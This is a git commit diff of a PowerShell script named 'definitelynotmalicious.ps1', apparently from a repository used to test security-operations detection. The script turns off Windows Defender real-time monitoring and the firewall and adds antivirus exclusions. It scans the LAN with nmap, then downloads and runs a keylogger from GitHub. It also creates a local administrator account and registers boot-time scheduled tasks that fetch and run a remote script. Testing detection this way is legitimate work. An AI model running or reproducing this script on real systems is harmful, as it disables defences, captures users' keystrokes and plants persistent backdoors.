8e3cf0107117622010cc070c32ec2a5c1d1fef93
mshapiro2025 <90416755+mshapiro2025@users.noreply.github.com>
2023-02-28 11:57:56 -0500

    Update definitelynotmalicious.ps1

--- definitelynotmalicious.ps1
+++ definitelynotmalicious.ps1
@@ -1,23 +1,30 @@
 whoami
 hostname
-Set-MpPreference -DisableRealTimeMonitoring $True
 $nethost = Read-Host -Prompt "Enter the network address of your LAN (ex. 192.168.201)"
 $firstip = Read-Host -Prompt "Enter the first host ID you want to scan (ex. for 192.168.201.50, enter 50)"
 $lastip = Read-Host -Prompt "Enter the last host ID you want to scan"
 Set-NetFirewallProfile -Profile Public -Enabled False
 Set-MpPreference -DisableRealTimeMonitoring $True
-Invoke-WebRequest https://nmap.org/dist/nmap-7.93-setup.exe -OutFile "C:\Users\setup"
+Add-MpPreference -ExclusionPath "C:\Users\setup"
+Invoke-WebRequest https://nmap.org/dist/nmap-7.93-setup.exe -OutFile "C:\Users\setup\nmap-7.93-setup.exe"
 cd C:\Users\setup
 cmd.exe /c nmap-7.93-setup.exe
 cmd.exe /c nmap -T4 -A -v ($nethost + "." + $firstip + "-" + $lastip) -oN netscan
-Invoke-WebRequest https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt -OutFile C:\Users\setup\keylogger.ps1
-Start-Sleep -s 60
+Invoke-WebRequest https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1 -OutFile "C:\Users\setup\keylogger.ps1"
+Start-Sleep -s 30
+Add-MpPreference -ExclusionPath "C:\Users\setup\keylogger.ps1"
+New-Item "C:\temp\" -itemType Directory
+cd C:\Users\setup
+#(Get-Content keylogger.ps1) -replace '"C:\temp\keylogger.txt"', '"C:\Users\setup\keylogger.txt"' | Add-Content keylogger1.ps1
+#Remove-Item keylogger.ps1
+#Rename-Item keylogger1.ps1 keylogger.ps1
 ./keylogger.ps1
-New-LocalUser -Name "newuser" -AccountNeverExpires -Password "password123!"
+$password = Read-Host -Prompt "Enter the password of your new user: " -AsSecureString
+New-LocalUser -Name "newuser" -AccountNeverExpires -Password $password
 Add-LocalGroupMember -Group "Administrators" -Member "newuser"
-Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript?token=GHSAT0AAAAAAB7CSJAA2FHRJCBOR5PGUTPYY7U6YNA -OutFile "C:\Users\setup\startupscript.ps1"
+Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\setup\startupscript.ps1"
 $action1 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-File "C:\Users\setup\startupscript.ps1"'
-$action2 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument 'Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript?token=GHSAT0AAAAAAB7CSJAA2FHRJCBOR5PGUTPYY7U6YNA -OutFile C:\Users\setup\startupscript.ps1'
+$action2 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument 'Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\setup\startupscript.ps1"'
 $trigger1 = New-JobTrigger -AtStartup -RandomDelay "00:30:00"
 $trigger2 = New-JobTrigger -AtStartup
 Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "task1"
